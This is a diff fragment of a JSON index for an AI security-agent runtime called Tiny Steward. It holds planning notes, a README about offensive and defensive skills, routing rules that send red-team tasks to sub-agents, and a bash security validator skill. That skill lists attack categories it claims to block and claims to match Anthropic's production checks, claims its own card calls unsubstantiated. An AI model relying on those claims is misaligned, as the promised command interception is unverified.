+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "---\nname: Delegate panes mailbox\noverview: \"Plan multiphase Tiny Steward \u2014 P0\u2013P3 hechos. Continuaci\u00f3n P4\u2013P8: reasoning Qwythos + presupuesto think (chat_template_kwargs, thinking_budget_tokens, KV-safe), hardening, cuarentena OpenClaw, higiene delegate, smoke tests. Incluye ap\u00e9ndice de referencia llama-server (sampling / prompt / slots / reasoning / ctx).\"\ntodos:\n  - id: p0-dispatch-ls\n    content: Fix ls/mkdir attrs.path dispatch + Path not found vs Not a directory; align SYSTEM_PROMPT to native tool_call; harden tools resend; 503 retry on stream\n    status: completed\n  - id: p0-tests-dispatch\n    content: Add test_execute_action_dispatch.py + extend tool_call parsing for ls attrs/tool_call\n    status: completed\n  - id: p1-mailbox\n    content: Add core/mailbox.py maildir; drain between LLM turns; inject as role=user name=supervisor_*\n    status: completed\n  - id: p2-child-terminal\n    content: config ui.delegate_terminal auto; WT/console/tmux; steward.py --delegate-mode; session tree; block until result\n    status: completed\n  - id: p3-llamacpp-verify\n    content: Document atomic --parallel 1 / ctx; 503 retry on stream path\n    status: completed\n  - id: p4-reasoning-kwargs\n    content: \"Wire chat_template_kwargs + thinking_budget_tokens; stable cache_prompt; stream reasoning_content; persist think; /set; document KV-safe vs KV-breaking params\"\n    status: completed\n  - id: p5-hardening-debt\n    content: \"write/append path fallback; trim dual tools+examples (tools once = less KV churn); is_delegate_child; mailbox; spawn fail-fast; retire MicroAgent\"\n    status: completed\n  - id: p6-quarantine-openclaw-meta\n    content: \"Exclude OpenClaw _meta skills from index (delegation-gate, pulse-routing, delegate-router, nomic-local, paid-bash-security)\"\n    status: completed\n  - id: p7-delegate-task-hygiene\n    content: \"Stop SYSTEM_PROMPT example text being used as live delegate tasks; shorten How-to-act examples; assert problem != example stub\"\n    status: completed\n  - id: p8-primitive-smoke-tests\n    content: \"Tests: ls/mkdir/write/read, pwsh, python unicode/emoji hello_world, tool_call round-trip\"\n    status: completed\nisProject: false\n---\n\n# Delegaci\u00f3n observable + backlog post-auditor\u00eda\n\n## Estado (2026-07-16 \u2192 cerrado P0\u2013P8)\n\n**P0\u2013P8 completados** (tests unitarios verdes; OpenClaw `_meta` sin leaks en index live).  \nSiguiente ciclo: [`fuera-de-alcance.md`](fuera-de-alcance.md) (fases F1+).\n\n## Estado hist\u00f3rico (2026-07-16)\n\nFuentes cruzadas:\n\n- Implementaci\u00f3n P0\u2013P3 en repo (c\u00f3digo + tests verdes)\n- Auditor\u00eda de acoplamientos / fallos silenciosos (sesi\u00f3n Cursor)\n- [`sessions/qwythos-review.md`](sessions/qwythos-review.md) (contribuci\u00f3n directa Qwythos \u2014 corregir: **503 en stream ya est\u00e1**; no reabrir)\n- Sesi\u00f3n [`minor-ui-review`](sessions/minor-ui-review.json) + hijo `...__nda-review_4352c453` (delegate con task = ejemplo del SYSTEM_PROMPT)\n- Chat template Qwythos (Jinja): `enable_thinking`, `preserve_thinking`, `reasoning_content`, `tools` \u2192 `<tool_",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:plans/archivos-retirados",
+      "type": "article",
+      "name": "Archivos retirados / absorbidos",
+      "filePath": "plans\\archivos-retirados.md",
+      "summary": "Registro de c\u00f3digo eliminado o absorbido (2026-07-16), para que no parezca un borrado accidental.",
+      "tags": [
+        "plans",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "# Archivos retirados / absorbidos\n\nRegistro de c\u00f3digo eliminado o absorbido (2026-07-16), para que no parezca un borrado accidental.\n\n---\n\n## `core/micro_agent.py` \u2014 **eliminado**\n\n| | |\n|---|---|\n| **Qu\u00e9 era** | Stub Phase-2: clase `MicroAgent` que armaba un system prompt de skill agent y llamaba `atomic_llm.chat()` en un solo turno (sin loop de tools, sin mailbox, sin pane). |\n| **Por qu\u00e9 se retir\u00f3** | Duplicaba la l\u00f3gica ya viva en `Runtime._build_delegate_system_prompt` + `_run_delegate_loop` / `_delegate_with_terminal`. |\n| **D\u00f3nde vive ahora** | `Runtime` delegate paths + `core/delegate_terminal.py` + `steward.py --delegate-mode`. |\n| **Recuperar** | `git show <commit>:core/micro_agent.py` \u2014 no reintroducir en el import path. |\n\n---\n\n## Skills `_meta/primitives/*.md` \u2014 **reescritas**\n\nDe `<action name=\"\u2026\">` legacy \u2192 `<tool_call>/<parameter=\u2026>` nativo (evita que `help()` ense\u00f1e un dialecto que el modelo mezclaba con `<path>` bare).\n\n---\n\n## Sesiones en git \u2014 **untracked**\n\n`sessions/*.json` y `*.interactions.jsonl` salieron del \u00edndice (`git rm --cached`). Quedan en disco. Ver `docs/operator.md`.\n\n---\n\n## Otros\n\n| \u00cdtem | Qu\u00e9 pas\u00f3 |\n|------|----------|\n| SYSTEM_PROMPT ejemplos largos / Acme NDA | Recortados; ejemplos `ls` + `write` con `<parameter=\u2026>` |\n| `/set thinking` \u2192 extra_params | \u2192 `chat_template_kwargs`; `medium` se rechaza |\n| Pegar transcripts | \u2192 `/attach` y `@path` |\n| OpenClaw `_meta/{delegation-gate,\u2026}` | Excluidos del index; archivos en disco |\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:plans/fuera-de-alcance",
+      "type": "article",
+      "name": "Fuera de alcance \u2192 siguiente ciclo (F1+)",
+      "filePath": "plans\\fuera-de-alcance.md",
+      "summary": "**Origen:** diferidos del plan multiphase + post P0\u2013P8. **Archivo hist\u00f3rico:** [`archive/`](archive/) **Operador:** [`docs/operator.md`](../docs/operator.md) **Retiros:** [`archivos-retirados.md`](...",
+      "tags": [
+        "plans",
+        "roadmaps & planning"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Roadmaps & Planning",
+        "content": "# Fuera de alcance \u2192 siguiente ciclo (F1+)\n\n**Origen:** diferidos del plan multiphase + post P0\u2013P8.  \n**Archivo hist\u00f3rico:** [`archive/`](archive/)  \n**Operador:** [`docs/operator.md`](../docs/operator.md)  \n**Retiros:** [`archivos-retirados.md`](archivos-retirados.md)\n\nP0\u2013P8 y F1\u2013F2 **hechos**. Tambi\u00e9n (2026-07-16 noche):\n\n- Parser tolera `<path>` / hybrid `</parameter>`; ejemplo `write` en SYSTEM_PROMPT\n- `/attach` + `@path` para transcripts largos (sin pegar)\n- Nudge si solo hay think sin tool_call\n- Skills `_meta/primitives` en formato `<tool_call>`\n- `sessions/` untracked; playbook de operador\n\n**F7 (2026-07-17) hecho:**\n\n- Prompt hygiene: refuse pasted REPL chrome; scrub outbound; empty think-only placeholder\n- Client `backends.gate` for orch/atomic/embed (interactive > dream)\n- `/dream` + `/memory` \u2192 `*.memory.jsonl` / `*.memory.md`; compact prefers memories\n\n**F3 parcial (2026-07-17) \u2014 cliente s\u00ed, host no:**\n\n- `llm.orchestrator.id_slot: 0` enviado en el body; atomic sin clave (default server `-1`)\n- `GET /props` check al arranque; `llm.*.launch` + `/backend`; gate sin cambios\n- **Launcher F3 knobs:** `launch.parallel` \u2192 `-Parallel N`, `profile`/`context`, `expect_total_slots` verificado post-start v\u00eda `/props`; `/backend props <lane>`\n- `cache_ram` / `cache_idle_slots` / `slot_save_path` = anotaciones hasta que los scripts host las acepten (`extra_args`)\n- **Host `--parallel N` real sigue siendo ops** (editar/lanzar scripts en `llamacpp`) \u2192 F4 disk-slot API sigue bloqueado (`f3 --> f4`)\n- Condiciones de arranque host: [`docs/operator.md`](../docs/operator.md) \u00a7 F3 / `/backend`\n\n**F4 parcial (2026-07-17) \u2014 alcance aclarado + metadata; no KV client:**\n\n- llama.cpp ya hace longest-prefix/LRU + prompt-cache; Steward **no** reimplementa slots/KV\n- \u00c1rbol de sesiones ya existe (`/tree`, `metadata.parent|children`)\n- Cliente: `metadata.orch_id_slot` se sella desde `llm.orchestrator.id_slot` (visible en `/tree`)\n- Persistencia KV a disco (`--slot-save-path` + `/slots/{id}?action=\u2026`) = **ops host**, pendiente de F3 `--parallel`\n- Steward solo anota `launch.slot_save_path` en `/backend props` \u2014 **no** llama `POST /slots`\n- \u201cRestore\u201d Steward = `/session <name>` + LCP servidor\n\n**Provider profiles (adyacente, 2026-07-17):**\n\n- `llm.*.provider` en `config.yaml`; Runtime resuelve perfiles; `/providers` en REPL\n- Mixins `runtime_meta` / `runtime_delegate` ya extra\u00eddos\n- Evals/fixtures: `evals/providers/{qwythos,qwen3_json}/` + `tests/test_provider_evals.py` (hecho)\n\n**F5 (2026-07-17) \u2014 cliente hecho; host mmproj opcional:**\n\n- Probe `GET /v1/models` multimodal \u2192 `runtime.vision_enabled`; config `llm.orchestrator.vision: auto|on|off`\n- `/image`, `/attach` image, `@png` \u2192 OpenAI `image_url` data-URI; session stores path refs\n- Atomic text-only (images stripped); refuse with actionable error if vision off\n- **Ops:** restart orch with `-WithVision` / `--mmproj` before expecting grounded answers (see operator.md)\n\n```mermaid\nflowchart TD\n  f3[F3_parallel_slo",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:README",
+      "type": "article",
+      "name": "Tiny Steward \u2014 Semantic Capability Graph Micro-Agent Runtime",
+      "filePath": "README.md",
+      "summary": "<p align=\"center\"> <img src=\"https://raw.githubusercontent.com/anarcoiris/tiny-steward/main/assets/banner.png\" alt=\"Tiny Steward\" width=\"60%\"> </p>",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Tiny Steward \u2014 Semantic Capability Graph Micro-Agent Runtime\n\n<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/anarcoiris/tiny-steward/main/assets/banner.png\" alt=\"Tiny Steward\" width=\"60%\">\n</p>\n\n<div align=\"center\">\n\n[![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](LICENSE)\n[![Python](https://img.shields.io/badge/Python-3.11+-blue)](https://python.org)\n[![MITRE ATT&CK](https://img.shields.io/badge/MITRE%20ATT&CK-v19.1-blue)](https://attack.mitre.org)\n[![GitHub stars](https://img.shields.io/github/stars/anarcoiris/tiny-steward?style=flat-square)](https://github.com/anarcoiris/tiny-steward/stargazers)\n\n</div>\n\n**\ud83c\udfaf AI agents with expert cybersecurity skills \u2014 structured knowledge for autonomous security operations**\n\n\n\n---\n\n> \u26a0\ufe0f **Community Project** \u2014 This is an independent, community-created project. Not affiliated with any specific company or organization.\n>\n> \ud83d\udd10 **Authorized & lawful use only.** This runtime includes offensive and dual-use techniques (e.g., red-team C2, phishing simulation, exploitation) intended for authorized penetration testing, security research, defense, and education. Only use them against systems you own or have **explicit written permission** to test, and comply with all applicable laws and rules of engagement. You are solely responsible for how you use these skills. See [SECURITY.md](SECURITY.md).\n\n## \ud83c\udfaf What is Tiny Steward?\n\nTiny Steward is a **semantic capability graph micro-agent runtime** that gives AI agents access to structured cybersecurity knowledge \u2014 turning generic LLMs into capable security analysts with practitioner-level workflows encoded directly into the system.\n\nUnlike tool repos that give you scripts or payloads, this project provides an **AI-native knowledge base** built from the ground up for agentic workflows: YAML frontmatter for sub-second discovery, structured Markdown for step-by-step execution, and reference files for deep technical context.\n\n**Every skill encodes real practitioner workflows**, not generated summaries. Clone it, point your agent at it, and your next security investigation gets expert-level guidance in seconds.\n\n### Key Capabilities\n\n| Feature | Description |\n|---------|-------------|\n| **817+ cybersecurity skills** | Spanning 29 security domains, each following the open-standard format |\n| **6-framework cross-mapping** | MITRE ATT&CK v19.1, NIST CSF 2.0, MITRE ATLAS, MITRE D3FEND, NIST AI RMF, and MITRE F3 |\n| **Semantic search** | Find relevant skills by describing what you need rather than searching keywords |\n| **Session management** | Long-running investigations with persistent context |\n| **Task execution** | Run single tasks and get structured results |\n| **Skill index building** | Automatically build embeddings for fast retrieval |\n\n## \ud83d\ude80 Quick Start\n\n### Option 1: npx (recommended)\n\n```bash\nnpx skills add anarcoiris/tiny-steward\n```\n\n### Option 2: Git clone\n\n```bash\ngit clone https://github.com/anarcoiris/tiny-steward.git\ncd tiny-s",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:RULES",
+      "type": "article",
+      "name": "Tiny Steward \u2014 global rules",
+      "filePath": "RULES.md",
+      "summary": "These rules apply to every new steward session (injected after the built-in system prompt). Keep this file short: changes invalidate the KV prompt prefix for open sessions.",
+      "tags": [
+        "core guidelines & identity"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Core Guidelines & Identity",
+        "content": "# Tiny Steward \u2014 global rules\n\nThese rules apply to every new steward session (injected after the built-in system prompt).\nKeep this file short: changes invalidate the KV prompt prefix for open sessions.\n\n## MEMENTO (context budget)\n\nEverything you can read and generate in a session is limited. Past a point, history is\ncompacted/summarized. Treat valuable results as scarce: write them to `task.md` /\n`plan.md` / review notes instead of relying on chat memory alone. Anticipate short-,\nmid-, and long-horizon attention. Prefer being succinct and effective. Use tools\n(clock, python calc, scripts) when arithmetic or time comparisons are unreliable \u2014\nbuild your own helpers when needed. `RULES.md` and related home files are durable;\nprotect them and spend tokens carefully.\n\n## Working artifacts\n\n1. For any user request that will take more than one turn, create or update a `task.md`.\n2. For research or multi-step implementation, create or update a `plan.md` first.\n3. When finishing a reviewable chunk, write a short review (see `sessions/template-review.md`).\n4. Long logs/transcripts: use `/attach <path>` or `@\\\"path\\\"` \u2014 never paste huge terminal dumps.\n\n## Workspace\n\n5. Home is the process cwd (Tiny Steward repo root). Prefer relative paths from that home.\n6. Tool calls must use `<parameter=NAME>\u2026## Task/Plan Artifacts\n\n- Use `task.md` for any solicitude / user request handling.\n- Use `plan.md` for research or implementation planning.\n- Enforce these usages consistently across all tasks.\n\n## Review Template Enforcement\n\n- The review template lives in `docs/planning_template.md`.\n- After completing a task chunk, generate a short review using that template.\n- This template is still weak; improve it over time.\n\n## Session Storage Organization\n\n- Each session.json should be inside a homonymous folder (to stop polluting sessions/ folder)\n- Keep each session's task.md or plans.md files inside that same folder",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/delegate-router/SKILL",
+      "type": "article",
+      "name": "Delegate router (main only)",
+      "filePath": "skills\\_meta\\delegate-router\\SKILL.md",
+      "summary": "Apply only when agent id is **main**. Do not classify \u2014 pass full user intent to **router** for multi-step work.",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\delegate-router"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: delegate-router\ndescription: \"Thin spawn delegate for main: route plan/code/offensive to router; direct KB/shell one-shots.\"\nmetadata:\n  {\n    \"openclaw\": {\n      \"emoji\": \"\ud83d\udd00\",\n      \"requires\": { \"config\": [\"agents.list\"] }\n    }\n  }\n---\n\n# Delegate router (main only)\n\nApply only when agent id is **main**. Do not classify \u2014 pass full user intent to **router** for multi-step work.\n\n## Decision table\n\n| User intent | Action |\n|-------------|--------|\n| Conversational / clarify / summarize child result | Reply inline \u2014 **no spawn** |\n| Plan, strategy, roadmap, evaluate, Nomic setup, test planning | spawn **router** |\n| Code, files, edits, deliverables, KB corpus build | spawn **router** |\n| Offensive / red-team / pentest | spawn **router** |\n| Web research + organized KB (.md by topic) | spawn **router** |\n| Quick KB / playbook / config lookup | spawn **memory-search-ext** directly |\n| Single bounded shell command (`ls`, one exec) | spawn **atomic-exec** directly |\n\n## Hard rules\n\n- **Never** spawn `planner`, `coder`, `skills-offensive`, or `skills-penetration-testing` from main \u2014 use **router**.\n- **Never** use `atomic-exec` for planning, roadmaps, or Nomic architecture \u2014 that is **router \u2192 planner**.\n- Always `sessions_yield` after spawn accepted.\n- Cross-agent spawns use default **`context: \"isolated\"`** \u2014 never `context: \"fork\"`.\n- Pass full user intent in `task`; do not pre-classify.\n- **`sessions_spawn` requires all fields:** `agentId`, `task`, `taskName`, `lightContext: true`. Never call with empty args.\n- Config path: `/home/openclaw/.openclaw/openclaw.json` (not `config/deployment/`).\n- Use `agents_list` if unsure which `agentId` values are allowed.\n- **After spawn accepted, next tool call MUST be `sessions_yield`** \u2014 no assistant text to user before yield.\n\n## On wake after yield\n\nChild results arrive as a **user turn**, not in `subagents` output. Look for:\n\n1. `[Internal task completion event]` with `Child result:` \u2014 summarize that block for the user.\n2. Router passthrough (if you spawned router) \u2014 same `Child result` content from router's terminal message.\n\nIf the event is missing but `subagents` shows `done`, call **`sessions_history`** on the child's `session_key` from the event header or recent list; summarize the last assistant message.\n\n**Never invent** child findings. If no result is available, say the child completed with no visible output and offer to re-run.\n\nDo **not** spawn again unless the user asks a new question or handoff says `status: continue` with work for main.\n\n## Spawn examples\n\nRoute to router:\n\n```\nsessions_spawn {\n  agentId: \"router\",\n  lightContext: true,\n  taskName: \"route_<slug>\",\n  task: \"<full user request>\"\n}\nsessions_yield\n```\n\nDirect KB lookup:\n\n```\nsessions_spawn {\n  agentId: \"memory-search-ext\",\n  lightContext: true,\n  taskName: \"kb_<slug>\",\n  task: \"<lookup question; read /home/openclaw/.openclaw/openclaw.json for config keys>\"\n}\nsessions_yield\n```\n\nConcurrent dual spawn (Nomic + maxDepth), t",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/delegation-gate/SKILL",
+      "type": "article",
+      "name": "Delegation Gate (lab / main only)",
+      "filePath": "skills\\_meta\\delegation-gate\\SKILL.md",
+      "summary": "Apply only when agent id is **main**. Do not apply on worker agents.",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\delegation-gate"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: delegation-gate\ndescription: \"Lab delegation gate: auto_lab main approval or interactive questionnaire before main spawns planner/coder.\"\nmetadata:\n  {\n    \"openclaw\": {\n      \"emoji\": \"\ud83d\udea6\",\n      \"requires\": { \"config\": [\"agents.list\"] }\n    }\n  }\n---\n\n# Delegation Gate (lab / main only)\n\nApply only when agent id is **main**. Do not apply on worker agents.\n\n## Policy source\n\n1. `read` `/home/openclaw/.openclaw/delegation-gate-policy.json`.\n2. `read` `/home/openclaw/.openclaw/workspace/memory/delegation-gate-state.json` before any planner/coder spawn.\n\nDefault lab mode: **`gateMode: auto_lab`**.\n\n## Hard rules (never skip)\n\nBefore `sessions_spawn` targeting `planner` or `coder`:\n\n1. Classify the request.\n2. Apply gate mode (auto or interactive).\n3. **`write`** `/home/openclaw/.openclaw/workspace/memory/delegation-gate-state.json` in the same turn, **before** spawn.\n4. Spawn with typed `agentId` (ADR-004).\n\n`memory-search-ext` and `atomic-exec` spawns do **not** require gate approval unless stand-ins for planner/coder work.\n\n## Auto path (`gateMode: auto_lab`)\n\nWhen policy `gateMode` is `auto_lab` and user has not run `/gate interactive`:\n\n1. Classify \u2192 `approved_mode` + target `agentId`.\n2. If target is in `alwaysAskAgentIds` \u2192 **interactive**.\n3. If signal matches `alwaysAskSignals` \u2192 **interactive**.\n4. Else auto-approve with `approved_by: \"main\"`, then `sessions_spawn` \u2192 `sessions_yield`.\n\n## Interactive path\n\nWhen escalated: write `pending` entry, post questionnaire, wait for user `/approve`, then spawn.\n\n## After approval\n\nFollow spawn map in [`pulse-routing`](../pulse-routing/SKILL.md). Gate controls **when**; typed `agentId` controls **how**.\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/nomic-local/SKILL",
+      "type": "article",
+      "name": "Nomic local (gateway)",
+      "filePath": "skills\\_meta\\nomic-local\\SKILL.md",
+      "summary": "Read `/home/openclaw/.openclaw/workspace/docs/nomic-local.md` for full setup.",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\nomic-local"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: nomic-local\ndescription: \"Local Nomic/embeddings setup for this gateway: ollama-nomic :11438, memorySearch, KB paths.\"\nmetadata:\n  {\n    \"openclaw\": {\n      \"emoji\": \"\ud83e\uddec\",\n      \"requires\": { \"config\": [\"agents.defaults.memorySearch.enabled\"] }\n    }\n  }\n---\n\n# Nomic local (gateway)\n\nRead `/home/openclaw/.openclaw/workspace/docs/nomic-local.md` for full setup.\n\nQuick facts:\n- Provider: `ollama-nomic` @ `http://172.22.48.1:11438`\n- Model: `nomic-embed-text`\n- Plugin: `memory-core`\n- Indexed paths: `workspace/docs`, `skills`, `plans`, `knowledge`\n- Config: `/home/openclaw/.openclaw/openclaw.json` \u2192 `agents.defaults.memorySearch`\n\nFor test plans or architecture questions, router should spawn **planner** \u2014 not answer from this skill alone.\n\n## Router workflow (test plan)\n\n1. Optional: `read` `nomic-local.md` + `openclaw.json` (one pass each) \u2014 **do not write the plan**.\n2. Run delegation-gate (`auto_lab` approves planner).\n3. **`sessions_spawn` `agentId: \"planner\"`** with full task text and absolute output path.\n4. **`sessions_yield`** \u2014 next tool call must be yield, not more reads.\n\nAllowed `agentId` values for router spawn: `planner`, `coder`, `memory-search-ext`, `atomic-exec`, `skills-offensive`, `skills-penetration-testing`. Use `agents_list` if unsure.\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/paid-bash-security-v1-1/skill-card",
+      "type": "article",
+      "name": "skill-card",
+      "filePath": "skills\\_meta\\paid-bash-security-v1-1\\skill-card.md",
+      "summary": "23-validator bash security chain validated in production Claude Code deployments. Every check closed a real attack vector. <br>",
+      "tags": [
+        "skills meta",
+        "skills\\_meta\\paid-bash-security-v1-1"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "## Description: <br>\n23-validator bash security chain validated in production Claude Code deployments. Every check closed a real attack vector. <br>\n\nThis skill is ready for commercial/non-commercial use. <br>\n\n## Publisher: <br>\n[thebrierfox](https://clawhub.ai/user/thebrierfox) <br>\n\n### License/Terms of Use: <br>\nMIT-0 <br>\n\n\n## Use Case: <br>\nDevelopers and agent operators use this skill as shell-safety guidance for reviewing and configuring Bash/Zsh command validation in OpenClaw-style agent workflows. <br>\n\n### Deployment Geography for Use: <br>\nGlobal <br>\n\n## Known Risks and Mitigations: <br>\nRisk: Security evidence says the skill makes strong protection claims that the packaged artifact does not substantiate. <br>\nMitigation: Treat it as shell-safety guidance rather than a verified command-interception control unless the publisher provides architecture details, enforcement logic, and tests showing commands are intercepted. <br>\n\n\n## Reference(s): <br>\n- [ClawHub skill page](https://clawhub.ai/thebrierfox/paid-bash-security-v1-1) <br>\n- [OpenClaw Bash Safety primer](https://clawhub.ai/skills/free-bash-safety-primer) <br>\n- [Production Agent Ops bundle](https://clawhub.ai/skills/production-agent-ops-battle-tested-architecture-pack) <br>\n\n\n## Skill Output: <br>\n**Output Type(s):** [text, markdown, shell commands, configuration, guidance] <br>\n**Output Format:** [Markdown with inline shell commands and configuration snippets] <br>\n**Output Parameters:** [1D] <br>\n**Other Properties Related to Output:** [None] <br>\n\n## Skill Version(s): <br>\n1.1.1 (source: frontmatter and release evidence) <br>\n\n## Ethical Considerations: <br>\nUsers should evaluate whether this skill is appropriate for their environment, review any generated or modified files before relying on them, and apply their organization's safety, security, and compliance requirements before deployment. <br>\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/paid-bash-security-v1-1/SKILL",
+      "type": "article",
+      "name": "Bash Security Validator \u2014 Production OpenClaw Shell Safety",
+      "filePath": "skills\\_meta\\paid-bash-security-v1-1\\SKILL.md",
+      "summary": "This skill installs a 23-validator bash security chain \u2014 the exact sequence Anthropic runs in production Claude Code before every shell execution. It activates on every `exec` tool call your OpenCl...",
+      "tags": [
+        "[security",
+        "bash",
+        "clawhavoc]",
+        "engineering",
+        "hardening",
+        "production",
+        "skills meta",
+        "skills\\_meta\\paid-bash-security-v1-1"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: Bash Security Validator \u2014 Production OpenClaw Shell Safety\nslug: bash-security-validator-production-openclaw-shell-safety\nversion: 1.1.1\nauthor: IntuiTek\ntags: [security, production, engineering, hardening, bash, clawhavoc]\ndescription: 23-validator bash security chain validated in production Claude Code deployments. Every check closed a real attack vector.\n---\n\n# Bash Security Validator \u2014 Production OpenClaw Shell Safety\n\n> **Understand the threat model first?** Read the free primer:\n> [OpenClaw Bash Safety \u2014 Why Your Agent Is a Security Risk](https://clawhub.ai/skills/free-bash-safety-primer)\n> It covers what ClawHavoc exploited, why text-pattern matching alone fails, and\n> why this validator exists.\n\n---\n\n## What This Skill Does\n\nThis skill installs a 23-validator bash security chain \u2014 the exact sequence\nAnthropic runs in production Claude Code before every shell execution. It activates\non every `exec` tool call your OpenClaw agent makes.\n\n**Validator categories:**\n\n1. **Text-level** \u2014 Obvious attack pattern detection (destructive ops, unauthorized data transfer)\n2. **Structural** \u2014 Substitution injection, brace expansion, heredoc abuse\n3. **Encoding** \u2014 Unicode homoglyphs, zero-width characters, RTL overrides\n4. **Shell-specific (Bash)** \u2014 Dangerous builtins, history manipulation, alias injection\n5. **Shell-specific (Zsh)** \u2014 Separate blocklist; Zsh \u2260 Bash for dangerous commands\n6. **Persistence vectors** \u2014 Modifications to cron/init/systemd, shell profile backdoors\n7. **Escalation vectors** \u2014 Sudo config changes, setuid manipulation, capability grants\n\nEach category closes a distinct attack class. Skipping any one leaves a category\nof attack unblocked.\n\n---\n\n## Setup\n\n### Step 1 \u2014 Install\n\n```bash\nmkdir -p ~/.openclaw/workspace/skills/bash-security-validator\ncp SKILL.md ~/.openclaw/workspace/skills/bash-security-validator/\n```\n\nReload OpenClaw or restart the gateway.\n\n### Step 2 \u2014 Verify Activation\n\nAfter installation, the agent will validate bash commands before execution.\nTest with a safe command:\n\n```\nAsk your agent: \"Run: echo hello\"\n```\n\nNormal execution proceeds. Then test a flagged pattern \u2014 a command that pipes\nuntrusted remote content directly into a shell interpreter. The validator should\nintercept and refuse, explaining which validator triggered and why.\n\n### Step 3 \u2014 Configure Enforcement Mode\n\nTwo modes available. Set in your agent system prompt or SOUL.md:\n\n**Strict mode (recommended for production):** Block and report. The agent\nstops, explains what triggered, and asks for confirmation or alternative.\n\n**Audit mode (recommended for onboarding):** Log and warn. The agent notes\nthe risk but proceeds. Use this for 1\u20132 weeks to understand what your\nexisting workflows trigger before switching to strict.\n\nAdd to SOUL.md:\n```\nBash security enforcement: strict\n```\n\n---\n\n## The 23 Validators (Summary)\n\nFull specification in `BASH_SECURITY_ARCHITECTURE.md` (included in package).\n\n**Pre-processing gates (4):**\n- Input encoding ",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/append",
+      "type": "article",
+      "name": "Append to File",
+      "filePath": "skills\\_meta\\primitives\\append.md",
+      "summary": "Append content to an existing file (or create it if it doesn't exist).",
+      "tags": [
+        "[append",
+        "file",
+        "filesystem",
+        "log]",
+        "skills meta",
+        "skills\\_meta\\primitives"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: append\ntype: skill\nrequires: []\nprovides: [file-append]\ntags: [append, file, filesystem, log]\nrelated: [write, read]\n---\n\n# Append to File\n\nAppend content to an existing file (or create it if it doesn't exist).\n\n## Usage\n\n```xml\n<tool_call>\n<function=append>\n<parameter=path>\nlog.txt\n</parameter>\n<parameter=content>\n[timestamp] Task completed.\n</parameter>\n</function>\n</tool_call>\n```\n\n## Notes\n\n- Does not add a newline before content \u2014 include it if needed\n- Creates parent directories and file if they don't exist\n- Always use `<parameter=path>` / `<parameter=content>` (never bare `<path>`)\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/bash",
+      "type": "article",
+      "name": "Bash",
+      "filePath": "skills\\_meta\\primitives\\bash.md",
+      "summary": "Unix shell. On Windows, runs via WSL when available.",
+      "tags": [
+        "[bash",
+        "linux",
+        "shell",
+        "skills meta",
+        "skills\\_meta\\primitives",
+        "unix]",
+        "wsl"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: bash\ntype: skill\nrequires: []\nprovides: [shell, unix-commands, scripting]\ntags: [bash, shell, linux, wsl, unix]\nrelated: [pwsh, python, grep, find, permissions]\n---\n\n# Bash\n\nUnix shell. On Windows, runs via WSL when available.\n\n## Usage\n\n```xml\n<tool_call>\n<function=bash>\n<parameter=command>\nfind . -name \"*.py\" -type f | head -20\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/grep",
+      "type": "article",
+      "name": "Grep / Text Search",
+      "filePath": "skills\\_meta\\primitives\\grep.md",
+      "summary": "Search for a pattern in a file or directory.",
+      "tags": [
+        "[grep",
+        "find",
+        "pattern]",
+        "search",
+        "skills meta",
+        "skills\\_meta\\primitives",
+        "text"
+      ],
+      "complexity": "simple",
+      "knowledgeMeta": {
+        "wikilinks": [],
+        "category": "Skills Meta",
+        "content": "---\nname: grep\ntype: skill\nrequires: []\nprovides: [text-search]\ntags: [grep, search, find, text, pattern]\nrelated: [read, ls, find]\n---\n\n# Grep / Text Search\n\nSearch for a pattern in a file or directory.\n\nOne `path` per call; for several roots, issue separate grep calls.\n\n## Usage\n\n```xml\n<tool_call>\n<function=grep>\n<parameter=pattern>\nTODO\n</parameter>\n<parameter=path>\ncore/\n</parameter>\n</function>\n</tool_call>\n```\n",
+        "backlinks": []
+      }
+    },
+    {
+      "id": "article:skills/_meta/primitives/help",
+      "type": "article",
+      "name": "Help \u2014 Capability Discovery",
